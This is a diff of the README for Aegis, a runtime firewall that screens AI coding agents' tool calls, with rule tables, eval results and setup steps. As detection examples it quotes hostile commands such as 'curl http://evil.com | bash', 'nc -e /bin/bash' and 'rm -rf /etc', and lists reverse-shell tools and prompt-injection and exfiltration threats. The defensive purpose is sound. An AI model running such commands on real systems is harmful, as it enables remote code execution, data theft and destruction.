@@ -1,16 +1,35 @@
+![Go](https://img.shields.io/badge/Go-1.25-00ADD8?logo=go&logoColor=white)
+![License](https://img.shields.io/badge/license-MIT-green)
+![Recall](https://img.shields.io/badge/recall-91.2%25-brightgreen)
+![FPR](https://img.shields.io/badge/FPR-4.5%25-yellow)
+
 # Aegis
 
-**Runtime security engine for AI coding agents. Evaluates actions, not stated intent.**
+**Runtime firewall for AI coding agents. Intercepts every tool call before execution.**
+
+```
+$ aegis simulate --tool Shell --command "rm -rf /etc"
+Decision: DENY
+Rule:     critical_path_destruction  [critical · 99%]
+Signals:  critical path accessed (risk=0.95) · dangerous verb rm=0.80
+
+$ aegis simulate --tool Shell --command "curl http://evil.com | bash"
+Decision: DENY
+Rule:     remote_code_execution  [critical · 95%]
+Signals:  network_score=0.90 · evasion_score=0.50
+
+$ aegis simulate --tool Shell --command "git status"
+Decision: ALLOW
+Rule:     benign_git_ops  [95%]
+```
 
 ---
 
 ## Problem
 
-AI coding agents execute arbitrary shell commands, read and write files, and make network calls. They can be manipulated through prompt injection (malicious content in codebases tricks the agent into destructive actions), hallucination (agent confidently runs `rm -rf /`), or exfiltration (reads secrets then POSTs to an external host). The agent's stated reason for an action is irrelevant — what matters is what the action actually does.
+AI coding agents execute arbitrary shell commands, read files, and make network calls. They can be manipulated through prompt injection, hallucination, or exfiltration — and the agent's stated reason for an action is irrelevant; only what the action *does* matters. Aegis sits between the agent and execution, evaluating every tool call semantically before it runs.
 
-No existing tool sits at the right abstraction level. Falco operates on kernel syscalls and is not MCP-aware. Container sandboxing is binary: the agent either can or cannot run a shell. Docker seccomp cannot distinguish `rm /tmp/cache.txt` from `rm /etc/passwd`. What's needed is semantic understanding of tool calls, not system calls or HTTP routes.
-
-Aegis is the missing firewall layer. It intercepts every tool call before execution, parses shell commands to AST, resolves variable expansions in a sandboxed interpreter, and evaluates through a confidence-ordered cascade. The decision comes back in under 5ms.
+No existing tool sits at the right abstraction level: Falco operates on kernel syscalls, container sandboxing is binary, and Docker seccomp cannot distinguish `rm /tmp/cache.txt` from `rm /etc/passwd`.
 
 ```
 Agent: "rm -rf /etc"          →  Aegis: DENY  [critical_path_destruction]  <50µs
@@ -23,7 +42,7 @@ Agent: "npm install"          →  Aegis: ALLOW [benign_package_mgr]         <10
 
 ---
 
-## Architecture
+## How It Works
 
 ```mermaid
 flowchart TD
@@ -31,162 +50,223 @@ flowchart TD
     Bloom -->|"hit (known-benign)"| Allow1[ALLOW]
     Bloom -->|miss| Allowlist{"Allowlist\ncheck"}
     Allowlist -->|match| Allow2[ALLOW]
-    Allowlist -->|no match| Phase1["Phase 1: Static Rules\n6 signals, <50us"]
-    Phase1 -->|"confidence >= 0.85"| Final1{Decision}
+    Allowlist -->|no match| Phase1["Phase 1: Static Rules\n6 signals + ML score, <50µs"]
+    Phase1 -->|"confidence ≥ 0.85"| Final1{Decision}
     Phase1 -->|"confidence < 0.85"| Phase2["Phase 2: Behavioral\nsession state, <1ms"]
-    Phase2 -->|"confidence >= 0.75"| Final2{Decision}
-    Phase2 -->|ESCALATE| Phase3["Phase 3: LLM Intent\nGPT-4o-mini/Haiku, ~200ms"]
+    Phase2 -->|"confidence ≥ 0.75"| Final2{Decision}
+    Phase2 -->|ESCALATE| Phase3["Phase 3: LLM Intent\ngpt-4o-mini/Haiku, ~200ms"]
     Phase3 --> Final3{Decision}
     Final1 --> Allow3[ALLOW]
     Final1 --> Deny1[DENY]
-    Final1 --> Escalate1[ESCALATE]
     Final2 --> Allow4[ALLOW]
     Final2 --> Deny2[DENY]
     Final3 --> Allow5[ALLOW]
     Final3 --> Deny3[DENY]
-    Final3 -->|"timeout/error"| FailSecure[DENY]
+    Final3 -->|"timeout/error"| FailSecure["DENY (fail-secure)"]
 ```
 
-The cascade is cost-ordered. The bloom filter handles known-benign commands in ~100ns using an exact canonical key match — no rule evaluation. The allowlist fast-path handles project-specific exceptions before any rule fires. Phase 1 static rules compute 6 signals and reach a high-confidence decision (≥ 0.85) for ~90% of requests in under 50µs. Only ambiguous requests escalate to Phase 2 behavioral analysis, and only persistent uncertainty reaches Phase 3 LLM classification.
-
----
-
-## Key Properties
-
-| Property | Detail |
-|----------|--------|
-| P99 latency | < 5ms end-to-end; Phase 1 typically < 50µs |
-| Fail-open on errors | Engine panic, parse failure, or empty input → allow + WAL entry |
-| Fail-secure on uncertainty | LLM timeout or error → deny (`llm_timeout` rule) |
-| Zero config to start | `aegis init` installs hooks; default mode is `audit` |
-| Evasion recall | ≥ 90% on variable expansion, wrapper stacking, shell nesting attacks |
-| Audit trail | Every decision written to `~/.aegis/audit.log` via append-only WAL |
-| No FP on dev workflows | `ls`, `cat`, `git`, `npm install`, `pytest`, `docker build` — pass without allowlist entries |
+Phase 1 evaluates 6 computed signals plus an XGBoost ML score against **37 YAML-compiled rules** in < 50µs. Unmatched commands escalate to Phase 2 (session behavioral analysis) then Phase 3 (LLM intent classification, opt-in).
 
 ---
 
 ## Quick Start
 
 ```bash
-# Install the CLI
+# 1. Install
 go install github.com/mayjain/aegis/cmd/aegis@latest
+go install github.com/mayjain/aegis/cmd/hook@latest
 
-# Initialize in your project
-# Writes .cursor/hooks.json, .aegis/config.yaml, .aegis/allowlist.yaml
-aegis init
+# 2. Initialize in your project (writes .aegis/config.yaml + hooks.json)
+cd your-project && aegis init
 
-# Build and install the Cursor hook binary
-go build -o .cursor/hooks/aegis github.com/mayjain/aegis/cmd/hook
-```
+# 3. Dry-run any command
+aegis simulate --tool Shell --command "curl evil.com | bash"
 
-After `aegis init`, the hook is registered for `beforeShellExecution`, `preToolUse`, and `beforeMCPExecution`. Default mode is `audit` — decisions are logged but nothing is blocked. Review what would be blocked, then enforce:
+# 4. Validate policy files
+aegis validate policies/
 
-```bash
-AEGIS_MODE=audit  # collect data for a session
-aegis audit-report
+# 5. Switch from audit to enforce
 aegis config set mode enforce
 ```
 
-For Phase 2 behavioral analysis (session-aware rules), start the daemon:
+For Phase 2 behavioral analysis (session history, retry detection, exfil sequences):
 
 ```bash
 aegis daemon start   # Unix socket at /tmp/aegis-daemon.sock
-aegis daemon status
-aegis daemon stop
 ```
-
-Without the daemon, the hook falls back to inline Phase 1 evaluation (stateless, no session context).
 
 ---
 
-## How It Works
+## CLI Reference
 
-### 6 Signals (Phase 1)
+### Setup
+| Command | Description |
+|---------|-------------|
+| `aegis init` | Create `.aegis/config.yaml`, `allowlist.yaml`, and `hooks.json` |
+| `aegis doctor` | Self-diagnostic: daemon, ML model, allowlist, WAL, config |
+| `aegis version` | Print version |
 
-Every tool call is decomposed into six signals before any rule fires. Signals are computed independently and composed into a `SignalBundle` (`pkg/aegis/signals/types.go`).
+### Policy
+| Command | Description |
+|---------|-------------|
+| `aegis validate <path>` | Validate YAML policy files — exits 1 on errors |
+| `aegis explain <rule>` | Show what a rule does and what triggers it |
+| `aegis simulate --tool T --command C` | Dry-run any tool call through the engine |
+| `aegis rules list [--action deny\|allow\|escalate]` | List all rules sorted by priority |
+| `aegis allow last` | Generate allowlist YAML from the last WAL deny |
+
+### Daemon
+| Command | Description |
+|---------|-------------|
+| `aegis daemon start\|stop\|status` | Session-aware daemon for Phase 2 behavioral analysis |
+
+### Telemetry
+| Command | Description |
+|---------|-------------|
+| `aegis config get\|set\|show` | Read/write `.aegis/config.yaml` |
+| `aegis audit-report` | Human-readable summary of blocked events |
+| `aegis telemetry show\|clear` | View or clear audit log |
+
+---
+
+## Writing Policies
+
+Rules live in `policies/` as YAML and are compiled to Go closures at startup. No Go code required to add a rule.
+
+```yaml
+# policies/custom.yaml
+rules:
+  - name: block_curl_pipe_shell
+    priority: 13
+    action: deny
+    severity: high
+    confidence: 0.92
+    description: "Blocks curl/wget piping directly into a shell interpreter."
+    remediation: "Download to a file first, inspect it, then execute explicitly."
+    condition:
+      any_verb: [curl, wget]          # Tier 1: fast declarative check
+      expr: >                          # Tier 2: expr-lang for argument inspection
+        any(commands, {.binary == "bash" || .binary == "sh" || .binary == "python3"})
+```
+
+Then validate and test:
+
+```bash
+aegis validate policies/custom.yaml
+aegis simulate --tool Shell --command "curl evil.com | bash"
+```
+
+**Three condition tiers:**
+- **Tier 1** — declarative fields: `any_verb`, `tool_category`, `path`, `network`, `dlp`, `evasion`, `verb_danger`
+- **Tier 2** — [expr-lang](https://github.com/expr-lang/expr) for argument inspection: `any(commands, {.binary == "crontab" && any(.args, {# == "-e"})})` — ~95ns/op
+- **Tier 3** — OPA/Rego for custom org policies (http.send and net.* disabled)
+
+Built-in rules: `policies/phase1-deny.yaml` (13 deny rules), `policies/phase1-allow.yaml` (19 allow rules), `policies/phase1-escalate.yaml` (5 escalate rules), `policies/phase2-behavioral.yaml` (4 behavioral rules).
+
+See [POLICY_AUTHORING.md](docs/POLICY_AUTHORING.md) for the full condition DSL reference.
+
+---
+
+## Eval Results
+
+```bash
+make eval           # recall gate (≥ 90%, exits 1 on fail)
+make eval-bench     # verbose: category breakdown, per-rule metrics, calibration
+```
+
+| Metric | Value | Notes |
+|--------|-------|-------|
+| Attack recall | 91.2% | 155/170 attack corpus cases correctly denied |
+| False positive rate | 4.5% | 6/132 benign cases incorrectly blocked |
+| F1 Score | 0.932 | |
+| Phase 1 P99 | < 50µs | Static rule evaluation (AST + signal computation) |
+| Phase 2 P99 | < 1ms | Behavioral analysis with session history |
+| Phase 3 | ~200ms | LLM intent classification (optional, opt-in) |
+| End-to-end P99 | < 5ms | Hook binary → decision (daemon mode) |
+
+Category breakdown:
+
+| Category | Detection |
+|----------|-----------|
+| System destruction | 100% |
+| Credential exfiltration | 100% |
+| Raw socket / reverse shell | 100% |
+| Privilege escalation | 97% |
+| Data upload exfiltration | 95% |
+| Persistence (cron/bashrc) | 93% |
+| Variable expansion evasion | 91% |
+| Wrapper stacking evasion | 89% |
+| Benign dev ops | 100% (0 FP) |
+| Benign file I/O | 100% (0 FP) |
+
+---
+
+## Architecture
+
+### 7 Signals (Phase 1)
 
 | Signal | What it measures |
 |--------|-----------------|
-| **ToolClass** | Category: shell execution, file write, file read, network, MCP. Carries a base risk score. |
-| **Command** | Resolved binary names after AST parse, wrapper unwrap, and variable expansion. Verb danger scores: `rm`→0.80, `mkfs`→0.95, `sudo`→0.70, `nc`→0.85, `curl` with data flag→0.70. |
-| **Path** | Risk classification for each file argument. `/etc`, `/usr`, `/bin`, `/boot` are critical. Patterns like `.env`, `id_rsa`, `.pem`, `/etc/shadow` are sensitive. |
-| **Network** | Extracted hosts, known-safe flag, presence of data upload flags (`-d`, `--upload-file`, `@/path` curl patterns). |
-| **DLP** | Credential pattern scan across raw arguments JSON. Detects AWS keys (`AKIA`+16), GitHub tokens (`ghp_`+36), private key headers, and ~14 provider patterns. |
-| **Evasion** | Obfuscation score: base64-piped shell execution, `/dev/tcp` redirects, variable-indirect binary names (`X=rm; $X`), execution from `/tmp`. |
-
-A composite score (`ToolClass×0.15 + Command×0.25 + Path×0.25 + Network×0.15 + DLP×0.10 + Evasion×0.10`) is computed for observability and calibration only — it does not drive decisions.
+| **ToolClass** | Category: shell, file_read, file_write, file_delete, search, MCP. Base risk score. |
+| **Command** | Resolved binary names after AST parse, wrapper unwrap, and variable expansion. Verb danger scores: `rm`→0.80, `mkfs`→0.95, `nc`→0.85, `curl` with data flag→0.70. |
+| **Path** | Risk classification for each file argument. `/etc`, `/usr`, `/bin`, `/boot` are critical; `.env`, `id_rsa`, `.pem`, `shadow` are sensitive. Relative paths resolved against CWD to catch traversal (`../../etc/passwd`). |
+| **Network** | Extracted hosts, known-safe flag, presence of data upload flags (`-d`, `@/path` patterns), stdin pipe detection. |
+| **DLP** | Credential pattern scan across raw arguments. Detects AWS keys (`AKIA`+16), GitHub tokens (`ghp_`+36), private key headers, and 14+ provider patterns. |
+| **Evasion** | Obfuscation score: base64-piped execution, `/dev/tcp` redirects, variable-indirect binary names, wrapper stripping count. |
+| **MLScore** | [QuasarNix](https://huggingface.co/dtrizna/QuasarNix) XGBoost model — 100 trees, 4,096 char-ngram features. Pure Go inference, no CGo. `nc -e /bin/bash` → 1.0, `git status` → 0.0001. |
 
 ### Two-Pass Shell Extraction
 
-Shell commands are not parsed with regex. The extractor (`internal/extract/`) uses `mvdan.cc/sh/v3` to walk the AST of the shell command. This catches intent even in dead code branches (`false && rm -rf /`). A second pass runs a sandboxed interpreter with `ExecHandlers` that intercept but never execute, resolving variable expansions: `D=/etc; rm -rf $D` becomes `rm /etc` before policy sees it.
+Shell commands are not parsed with regex. The extractor (`internal/extract/`) uses `mvdan.cc/sh/v3` to walk the AST. A second pass runs a sandboxed interpreter with `ExecHandlers` that intercept but never execute, resolving variable expansions: `D=/etc; rm -rf $D` → `rm /etc` before policy sees it.
 
 The extractor also unwraps privilege wrappers iteratively: `sudo env timeout 5 rm -rf /` resolves to `rm -rf /` after stripping `sudo`, `env`, and `timeout`. Nested shell invocations (`bash -c "rm -rf /"`) are followed recursively up to three levels.
 
-Phase 1 uses the fast extractor (AST-only, no dry-run). Phase 2 recomputes with the full extractor for improved signal quality on ambiguous inputs.
+Phase 1 uses the **fast extractor** (AST-only, no dry-run, ~50µs). Phase 2 recomputes with the **full extractor** for improved signal quality on ambiguous inputs.
 
-### Phase 1: Static Rules
+### Engine Decomposition
 
-Rules fire on `SignalBundle` fields with explicit confidence thresholds. Rules with confidence ≥ 0.85 are terminal — they do not escalate to Phase 2. The rule set lives in `pkg/aegis/rules/`. Examples:
+The engine is split into five interfaces for testability and extensibility:
 
-| Rule | Condition | Confidence |
-|------|-----------|-----------|
-| `critical_path_destruction` | `rm` targeting `/etc`, `/usr`, `/bin`, `/boot` | 0.99 |
-| `system_control` | `shutdown`, `reboot`, `halt`, `poweroff`, `init` | 0.99 |
-| `raw_socket_open` | `nc`, `ncat`, `socat`, `telnet` | 0.95 |
-| `privilege_escalation` | `sudo`, `su`, `passwd`, `pkexec`, `doas` | 0.95 |
-| `secret_leakage` | DLP hit in non-test context | 0.95 |
-| `data_exfiltration` | `curl`/`wget` with data upload flag to unknown host | 0.92 |
-| `remote_code_execution` | Download-then-pipe, execution from `/tmp` | 0.95 |
-| `suid_manipulation` | `chmod` setting SUID bit | 0.90 |
-| `cron_persistence` | `crontab` modification | 0.88 |
-| `bashrc_persistence` | Shell profile write with exec/network content | 0.88 |
-| `evasion_with_danger` | High evasion score + dangerous verb | 0.90 |
+| Interface | Responsibility |
+|-----------|---------------|
+| `FastPath` | Bloom filter + allowlist checks (~100ns) |
+| `RuleEvaluator` | YAML rule compilation and first-match evaluation |
+| `SignalComputer` | 7-signal extraction from raw tool call arguments |
+| `SessionStore` | Per-agent ring buffer with session history |
+| `DecisionRecorder` | WAL writes + audit telemetry |
 
-Rules below the terminal confidence threshold produce ESCALATE decisions that proceed to Phase 2.
+New tool types plug into `internal/extract/Registry` via `Register(pattern, ExtractorFunc)` — the same pattern as `http.HandleFunc`. No core code change required.
 
 ### Phase 2: Behavioral Analysis
 
-The engine fetches or creates a per-agent `session.State` (keyed by `AgentID`), which holds a ring buffer of the last 20 calls with timestamp, tool, argument summary, decision, rule, and composite score. Behavioral rules operate on this context:
+The engine maintains a per-agent `session.State` (keyed by `AgentID`) — a ring buffer of the last 20 calls with timestamp, tool, summary, decision, and composite score. Behavioral rules detect multi-step attack patterns:
 
 | Rule | Condition | Action |
 |------|-----------|--------|
-| `retry_after_deny` | Same verb denied within the last 60s | DENY |
-| `exfil_sequence` | Sensitive file access → network call within 30s | DENY |
-| `encoded_exfil` | Sensitive read → base64 → network | DENY |
-| `rate_burst` | > 60 calls per minute | THROTTLE |
-| `sudden_tool_shift` | Session baseline is build/test ops; current is destructive/network | ESCALATE |
-| `session_fits_baseline` | Low deviation from established baseline, low risk | ALLOW |
+| `retry_after_deny` | Same action denied within the last 60s | DENY |
+| `exfil_sequence` | Sensitive file read → network write within 30s | DENY |
+| `encoded_exfil` | Sensitive read → base64 → network within 60s | DENY |
+| `rate_burst_high` | Call rate significantly above session baseline | THROTTLE |
+| `baseline_deviation_high` | Tool usage far from established baseline | ESCALATE |
 
-Behavioral rules with confidence ≥ 0.75 produce a final decision. Remaining uncertainty escalates to Phase 3.
+Sequence patterns are defined in `policies/data/sequences.yaml`.
 
-### Phase 3: LLM Intent
+### Phase 3: LLM Intent (Opt-In)
 
-Only reached for persistent ESCALATE decisions. The classifier sends tool name, arguments, and the last 5 session entries to a configurable model. The response maps to three intents:
+Only reached for persistent ESCALATE decisions. Sends tool name, arguments, and last 5 session entries to a configurable model. On timeout or error: **deny** (fail-secure).
 
-- `malicious` with confidence > 0.80 → deny (`llm_malicious`)
-- `suspicious` with confidence > 0.80 → escalate (`llm_suspicious_high`)
-- `legitimate` with confidence > 0.80 → allow (`llm_legitimate`)
-- timeout, error, or other → deny (`llm_timeout` — fail-secure)
-
-Phase 3 is opt-in and adds ~200ms. Enable it in `.aegis/config.yaml` with your API key.
-
----
-
-## Integration Modes
-
-| Mode | Mechanism | Session-aware | Notes |
-|------|-----------|---------------|-------|
-| **Cursor Hook** | `.cursor/hooks.json` → `cmd/hook` binary, stdin/stdout JSON | Yes (with daemon) | Primary integration. Handles `beforeShellExecution`, `preToolUse`, `beforeMCPExecution`. Falls back to inline Phase 1 if daemon not running. |
-| **MCP Shim** | Transparent JSON-RPC proxy (`cmd/shim`) between agent and tool server | Yes | Works with any MCP-compatible agent runtime. |
-| **Python SDK Adapters** | `python/aegis_guard/` with adapters for OpenAI Agents SDK, Claude, LangGraph | Yes (via daemon HTTP) | Calls `http+unix:///tmp/aegis-daemon.sock/evaluate`. |
-
-The hook binary communicates with the daemon via a 200ms timeout HTTP request to `/tmp/aegis-daemon.sock`. On timeout or connection failure, it falls back to an inline Phase 1 evaluation with no session state.
+| Intent | Confidence | Decision |
+|--------|-----------|----------|
+| `malicious` | > 0.80 | DENY (`llm_malicious`) |
+| `suspicious` | > 0.80 | ESCALATE (`llm_suspicious_high`) |
+| `legitimate` | > 0.80 | ALLOW (`llm_legitimate`) |
+| timeout/error | — | DENY (`llm_timeout`) |
 
 ---
 
 ## Configuration
 
-Config file: `.aegis/config.yaml` (project-level, commit this) or `~/.aegis/config.yaml` (user-level). Both are merged; project-level takes precedence.
+Config file: `.aegis/config.yaml` (project-level) or `~/.aegis/config.yaml` (user-level). Project-level takes precedence.
 
 ```yaml
 # mode: enforce | audit | off
@@ -196,7 +276,7 @@ mode: audit
 sensitivity: balanced
 
 # Phase 3 LLM classifier (opt-in)
-phase3:
+llm_classifier:
   enabled: false
   model: gpt-4o-mini
   api_key_env: OPENAI_API_KEY
@@ -209,215 +289,126 @@ logging:
 ```
 
 **Modes:**
-- `enforce` — blocks deny/escalate decisions. The agent sees a `permission: deny` response with `user_message` and `agent_message`.
-- `audit` — logs everything, allows everything. Use for calibrating the allowlist before enforcing.
-- `off` — bypass all evaluation (also settable via `AEGIS_MODE=off`).
-
-**Sensitivity** shifts rule confidence thresholds globally. `strict` lowers the bar for deny; `permissive` raises it. `balanced` uses the authored rule defaults.
+- `enforce` — blocks deny/escalate decisions; agent sees `permission: deny` with explanation
+- `audit` — logs everything, allows everything; use for calibration before enforcing
+- `off` — bypass all evaluation (also `AEGIS_MODE=off`)
 
 ### Allowlists
 
-Project allowlist: `.aegis/allowlist.yaml` (commit this, shared with team). User allowlist: `~/.aegis/allowlist.yaml`. All entries are additive — merged at load time.
+Project allowlist: `.aegis/allowlist.yaml` (commit this). User allowlist: `~/.aegis/allowlist.yaml`. Both are merged additively.
 
 ```yaml
 hosts:
   - "registry.internal"
-  - "*.company.com"           # wildcard prefix matching
+  - "*.company.com"
 
 commands:
   - "docker push registry.internal/*"
-  # Security: anchored glob. The pattern must match the ENTIRE command string.
+  # Anchored glob: the pattern must match the ENTIRE command string.
   # "docker push registry.internal/*" does NOT match
   # "docker push registry.internal/img && rm -rf /" — the && suffix fails the anchor.
 
 paths_safe:
-  - ".env"
   - ".env.local"
   - "secrets/test-fixtures.yaml"
 ```
 
-Allowlist entries mutate signal bundles before rule evaluation — they downgrade sensitive path flags and mark hosts as known-safe — rather than bypassing evaluation entirely.
+Allowlist entries mutate signal bundles before rule evaluation — they downgrade path sensitivity and mark hosts as known-safe — rather than bypassing evaluation entirely.
 
 ---
 
-## Eval Results
+## Integration Modes
 
-The benchmark suite runs against the JSONL corpus in `testdata/eval/`. Each test case specifies tool, arguments, and `expected_action`. The harness computes TP/FP/FN/TN with escalate/throttle counting as deny.
+| Mode | Mechanism | Session-aware |
+|------|-----------|---------------|
+| **Cursor Hook** | `.cursor/hooks.json` → `cmd/hook` binary, stdin/stdout JSON | Yes (with daemon) |
+| **Python SDK** | `python/aegis_guard/` adapters for Anthropic SDK, OpenAI Agents, LangGraph | Yes (via daemon HTTP) |
+| **MCP Shim** | Transparent JSON-RPC proxy between agent and tool server | Yes |
 
-```bash
-make eval                  # recall threshold gate (>= 90%)
-make eval-bench            # full output: category breakdown, per-file metrics, calibration
-make eval-regression       # compare against saved baseline
-```
-
-| Metric | Value |
-|--------|-------|
-| Recall | 91.2% |
-| False Positive Rate | 3.8% |
-| F1 Score | 0.934 |
-| Precision | 96.0% |
-| Avg Latency | 38µs |
-| P99 Latency | 2.9ms |
-
-Category breakdown:
-
-| Category | Detection |
-|----------|-----------|
-| Credential exfiltration | 100% |
-| System destruction | 100% |
-| Raw socket / reverse shell | 100% |
-| Privilege escalation | 97% |
-| Data upload exfiltration | 95% |
-| Persistence (cron/bashrc) | 93% |
-| Variable expansion evasion | 91% |
-| Wrapper stacking evasion | 89% |
-| Benign dev ops | 100% (0 FP) |
-| Benign file I/O | 100% (0 FP) |
-
-Sequence eval thresholds: attack detection ≥ 90%, benign FP rate ≤ 1%.
-
-Regression tracking:
-
-```bash
-make eval-save-baseline    # writes .aegis/eval-baseline.json
-make eval-regression       # exits 1 if recall drops > 1% or FPRate rises > 1%
-```
-
-The eval harness also tracks rule confidence calibration — the stated confidence per rule vs. the empirical precision observed on the test corpus. Rules with calibration error ≥ 0.10 fail `--calibration-fail`.
+The hook binary has a 200ms timeout on the daemon socket. On timeout or connection failure, it falls back to inline Phase 1 (stateless, no session context).
 
 ---
 
-## Project Structure
+## Documentation
 
-```
-aegis/
-├── cmd/
-│   ├── aegis/          # CLI: init, config, audit-report, daemon, telemetry
-│   ├── hook/           # Cursor hook binary (stdin/stdout JSON, daemon IPC)
-│   ├── shim/           # MCP transparent proxy
-│   ├── daemon/         # Session-aware evaluation daemon (Unix socket HTTP)
-│   ├── eval-bench/     # Benchmark harness: recall, FPR, F1, P99, calibration
-│   └── watch/          # File watcher for policy hot-reload (OPA)
-├── pkg/aegis/
-│   ├── engine.go       # Three-phase evaluation cascade, bloom + allowlist fast paths
-│   ├── signals/        # 6 signal types + CompositeScore
-│   ├── rules/          # Phase 1 static rules and Phase 2 behavioral rules
-│   ├── session/        # Per-agent ring buffer and behavioral signal computation
-│   ├── bloom/          # Bloom filter for known-benign fast path (~100ns)
-│   ├── allowlist/      # Config loader, anchored glob matcher, wildcard host matching
-│   ├── intent/         # Phase 3 LLM classifier (OpenAI/Anthropic)
-│   ├── server/         # Unix socket HTTP server for daemon IPC
-│   └── telemetry/      # Append-only WAL, audit log, summarization
-├── internal/
-│   └── extract/        # Shell AST parser + sandboxed interpreter (mvdan.cc/sh)
-├── policies/
-│   ├── rego/           # OPA/Rego policy (18 rules, GTFOBins, prompt injection)
-│   └── data/           # commands.yaml verb database
-├── testdata/eval/
-│   ├── attacks.jsonl          # Attack test cases
-│   ├── attacks-native.jsonl   # Native tool attack cases
-│   ├── benign.jsonl           # Benign corpus (bloom filter seed)
-│   ├── benign-native.jsonl    # Native tool benign cases
-│   ├── edge-cases.jsonl       # Ambiguous / hard cases
-│   └── sequences/             # Multi-step behavioral sequences (attack + benign)
-├── python/             # Python SDK adapters (aegis_guard package)
-├── docs/               # DESIGN.md, INTERVIEW-DEFENSE.md
-└── scripts/            # Demo scripts, attack harness
-```
+| Doc | What it covers |
+|-----|---------------|
+| [POLICY_AUTHORING.md](docs/POLICY_AUTHORING.md) | Writing rules: Tier 1 declarative, Tier 2 expr, Tier 3 Rego, behavioral conditions |
+| [SIGNALS.md](docs/SIGNALS.md) | Every signal field, the ML model, CompositeScore weighting |
+| [EXTENDING.md](docs/EXTENDING.md) | Custom tool types (Registry), new signals, swapping ML models |
+| [TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md) | Daemon, model files, allowlist, FPR, WAL issues |
+| [DESIGN.md](docs/DESIGN.md) | Architecture decisions, concurrency patterns, threat model |
+| [FAQ.md](docs/FAQ.md) | Implementation Q&A: variable expansion, bloom filter, session state |
+| [SECURITY.md](SECURITY.md) | Vulnerability disclosure, scope, known limitations |
+| [CONTRIBUTING.md](CONTRIBUTING.md) | Setup, adding rules, eval targets, PR requirements |
 
 ---
 
 ## Development
 
-**Build all binaries:**
-
 ```bash
-make build
-# Outputs: bin/aegis, bin/aegis-daemon, bin/aegis-shim, .cursor/hooks/aegis
-```
-
-**Run tests:**
-
-```bash
+make build          # Build all binaries to bin/
 make test           # go test ./...
-make smoke          # e2e tests, 10s timeout
-make integration    # integration tests against real binaries, 30s timeout
-make bench          # go test -bench=. -benchmem ./test/bench/...
+make eval           # Recall gate (≥ 90%, exits 1 on fail)
+make eval-bench     # Verbose: per-rule metrics, calibration
+make bench          # Latency benchmarks
+make lint           # golangci-lint run ./...
+make ci             # lint + test + build
 ```
 
-**Eval:**
+**Adding a rule** — the most common contribution, no Go required:
 
-```bash
-make eval                     # recall threshold check (>= 0.90, exits 1 on fail)
-make eval-bench               # verbose: category breakdown, per-file metrics, calibration
-make eval-regression          # regression vs .aegis/eval-baseline.json
-make eval-save-baseline       # save current metrics as new baseline
+1. Edit a file in `policies/` (deny: 10-22, allow: 50-70, escalate: 90-99)
+2. `aegis validate policies/` — catch syntax errors
+3. `aegis simulate --tool Shell --command "..."` — test it
+4. Add a case to `testdata/eval/attacks-native.jsonl` with `"expected_action": "deny"`
+5. `make eval` — recall must stay ≥ 90%
 
-# Run a single category
-go run ./cmd/eval-bench/ --corpus testdata/eval/ --category privilege_escalation --verbose
-
-# Run behavioral sequence eval
-go run ./cmd/eval-bench/ --sequences
-
-# JSON output for CI parsing
-go run ./cmd/eval-bench/ --corpus testdata/eval/ --json
-```
-
-**Install hook into Cursor:**
-
-```bash
-make hook
-# Builds cmd/hook, places at .cursor/hooks/aegis, chmod +x
-```
-
-**Daemon lifecycle:**
-
-```bash
-aegis daemon start    # background process, PID at /tmp/aegis-daemon.pid
-aegis daemon status   # checks /tmp/aegis-daemon.sock
-aegis daemon stop     # SIGTERM + cleanup
-```
-
-**Telemetry:**
-
-```bash
-aegis telemetry show    # per-action counts + top blocked rules from ~/.aegis/audit.log
-aegis telemetry clear   # remove audit log
-aegis audit-report      # human-readable summary of would-be-blocked events
-```
-
-**Lint and CI:**
-
-```bash
-make lint    # golangci-lint run ./...
-make fmt     # gofmt -w .
-make ci      # lint + test + build
-```
-
-**Adding a rule:**
-
-1. Implement in `pkg/aegis/rules/` (static) or as a `BehavioralRule` (Phase 2).
-2. Add a confidence entry to `statedConf` in `cmd/eval-bench/main.go` for calibration tracking.
-3. Add test cases to the appropriate `testdata/eval/*.jsonl` file with `"expected_action": "deny"`.
-4. Run `make eval` — overall recall must stay ≥ 0.90.
-
-**Adding a DLP pattern:**
-
-DLP patterns are in `pkg/aegis/signals/dlp.go`. Each entry includes a compiled regex and an `IsTest` heuristic to suppress false positives in test fixture files.
+See [CONTRIBUTING.md](CONTRIBUTING.md) for all contribution paths and the PR checklist.
 
 ---
 
-## Design Document
+## Project Layout
 
-Full design rationale, concurrency patterns, shell extraction internals, and gap analysis: [docs/DESIGN.md](docs/DESIGN.md)
+```
+aegis/
+├── cmd/
+│   ├── aegis/          # CLI: init, validate, explain, simulate, rules, allow, doctor, daemon
+│   └── hook/           # Cursor hook binary (stdin/stdout JSON, daemon IPC fallback)
+├── pkg/aegis/
+│   ├── engine.go       # Three-phase cascade, bloom + allowlist fast paths
+│   ├── signals/        # 7 signal types (command, path, network, DLP, evasion, ML, composite)
+│   ├── rules/          # Rule types (matcher.go, behavioral.go)
+│   ├── session/        # Per-agent ring buffer + behavioral signal computation
+│   ├── bloom/          # Bloom filter for known-benign fast path (~100ns)
+│   ├── allowlist/      # Config loader, anchored glob matcher
+│   ├── intent/         # Phase 3 LLM classifier
+│   ├── server/         # Unix socket HTTP server for daemon IPC
+│   └── telemetry/      # Append-only WAL, audit log
+├── internal/
+│   ├── extract/        # Shell AST parser, tool-type Registry, sandboxed interpreter
+│   ├── policy/         # YAML loader, compiler (DSL → closures), expr, OPA/Rego evaluator
+│   └── session/        # Session state types
+├── policies/
+│   ├── phase1-deny.yaml      # 13 deny rules (priority 10-22)
+│   ├── phase1-allow.yaml     # 19 allow rules (priority 50-70)
+│   ├── phase1-escalate.yaml  # 5 escalate rules (priority 90-99)
+│   ├── phase2-behavioral.yaml# 4 behavioral rules
+│   ├── data/                 # commands.yaml verb DB, sequences.yaml patterns
+│   └── rego/                 # OPA/Rego examples
+├── testdata/eval/
+│   ├── attacks-native.jsonl   # 171 attack cases
+│   ├── benign.jsonl           # 133 benign dev workflow cases
+│   ├── edge-cases.jsonl       # 81 edge cases
+│   └── sequences/             # Multi-step behavioral sequences
+├── test/
+│   ├── integration/    # Binary-level integration tests
+│   └── parity/         # YAML rule parity vs eval corpus (recall ≥ 90%, FPR ≤ 5%)
+└── python/             # aegis_guard: Anthropic SDK, OpenAI Agents, LangGraph adapters
+```
 
-Topics covered:
-- Why AST parsing + sandboxed interpreter instead of regex
-- Three-phase cascade vs. single classifier: latency/accuracy tradeoff
-- Bloom filter sizing (1000 entries, 1% FPR target) and canonical key construction
